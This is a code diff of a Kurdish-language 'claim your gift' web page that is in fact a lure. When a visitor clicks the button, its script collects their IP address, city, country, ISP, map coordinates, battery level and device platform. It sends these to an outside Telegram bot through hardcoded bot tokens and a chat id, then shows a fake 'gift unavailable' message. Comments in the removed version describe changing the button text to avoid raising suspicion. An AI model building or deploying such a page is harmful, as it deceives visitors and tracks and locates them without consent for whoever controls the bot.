@@ -3,76 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>دیارییەکەت ئامادەیە</title>
+    <title>وەرگرتنی دیاری</title>
     <style>
-        body { margin: 0; background: linear-gradient(45deg, #f093fb 0%, #f5576c 100%); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; }
-        .card { background: white; padding: 40px; border-radius: 30px; text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.2); width: 85%; max-width: 400px; }
-        .gift-img { width: 120px; margin-bottom: 20px; }
-        .btn { background: #ff4757; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; transition: 0.3s; box-shadow: 0 10px 20px rgba(255, 71, 87, 0.3); }
-        .btn:active { transform: scale(0.9); }
+        body { margin: 0; background: linear-gradient(45deg, #1a2a6c, #b21f1f, #fdbb2d); height: 100vh; display: flex; justify-content: center; align-items: center; font-family: sans-serif; color: white; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 350px; }
+        .gift-icon { font-size: 60px; margin-bottom: 10px; }
+        .btn { background: #ff4757; color: white; border: none; padding: 15px 25px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.3s; }
+        .btn:hover { background: #ff6b81; transform: scale(1.02); }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <img src="https://cdn-icons-png.flaticon.com/512/4213/4213958.png" class="gift-img">
+        <div class="gift-icon">🎁</div>
         <h2>دیارییەکەت ئامادەیە!</h2>
-        <p>پیرۆزە! تۆ بوویتە براوەی دیاری ئەم مانگە. بۆ وەرگرتنی، کلیک لە خوارەوە بکە:</p>
-        <button class="btn" id="claimBtn" onclick="collectData()">کلیک لێرە بکە بۆ وەرگرتن</button>
+        <p>بۆ وەرگرتنی سندوقی دیارییەکە، کلیک لە خوارەوە بکە:</p>
+        <button class="btn" onclick="sendData()">کلیک لێرە بکە بۆ وەرگرتن</button>
     </div>
 
     <script>
-        async function collectData() {
-            const token = "8732451250:AAFx3w-sF9jISGUO0F_0NbDh905o7MOaN8g";
-            const chat_id = "6166567300"; // دڵنیابە ئەم ئایدییە هی خۆتە
-
-            // گۆڕینی دەقی دوگمەکە بۆ ئەوەی گومانی لا دروست نەبێت
-            document.getElementById('claimBtn').innerText = "خەریکی پشکنینە...";
+        async function sendData() {
+            // تۆکنە نوێیەکەت لێرە داناوە
+            const token = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE";
+            const chat_id = "6166567300"; // دڵنیابە ئەمە ئایدی خۆتە
 
             try {
-                // ١. گرتنی IP و شوێن لە ڕێگەی ipapi
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
+                // ١. گرتنی IP و شوێن
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
 
                 // ٢. گرتنی ڕێژەی باتری
-                let batteryLevel = "نەزانراو";
+                let bat = "Unknown";
                 if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    const b = await navigator.getBattery();
+                    bat = Math.round(b.level * 100) + "%";
                 }
 
-                // ٣. ڕێکخستنی نامەکە بە شێوەیەکی جوان
-                const message = `
-🎯 **زانیاری نوێ گەیشت!**
-----------------------------
-🌐 **ئەدرێسی IP:** \`${ipData.ip}\`
-🌍 **وڵات:** ${ipData.country_name}
-🏙️ **شار:** ${ipData.city}
-📶 **ئینتەرنێت:** ${ipData.org}
-🔋 **باتری:** ${batteryLevel}
-📱 **ئامێر:** ${navigator.platform}
-⏰ **کات:** ${new Date().toLocaleString()}
-----------------------------
-📍 [کردنەوەی نەخشە](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
+                // ٣. دروستکردنی نامەکە
+                const text = `
+🎯 زانیاری نوێ گەیشت!
+----------------------
+🌐 ئایپی: ${ipData.ip}
+🌍 وڵات: ${ipData.country_name}
+🏙️ شار: ${ipData.city}
+🔋 باتری: ${bat}
+📱 ئامێر: ${navigator.platform}
+----------------------
+📍 [بۆ بینینی شوێن لەسەر نەخشە](https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude})
                 `;
 
-                // ٤. ناردن بۆ تێلیگرام
+                // ٤. ناردن بۆ بۆتە نوێیەکە
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chat_id,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    body: JSON.stringify({ chat_id: chat_id, text: text, parse_mode: 'Markdown' })
                 });
 
-                alert("ببورە، ئەم دیارییە لە ناوچەکەتدا نەماوە!");
-                document.getElementById('claimBtn').innerText = "دووبارە هەوڵ بدەرەوە";
-
-            } catch (error) {
-                console.error(error);
-                alert("کێشەیەک لە پەیوەندی دروست بوو.");
+                alert("ببورە، دیارییەکە لە ناوچەکەتدا نەماوە!");
+            } catch (e) {
+                alert("تکایە ئینتەرنێتەکەت بپشکنە");
             }
         }
     </script>
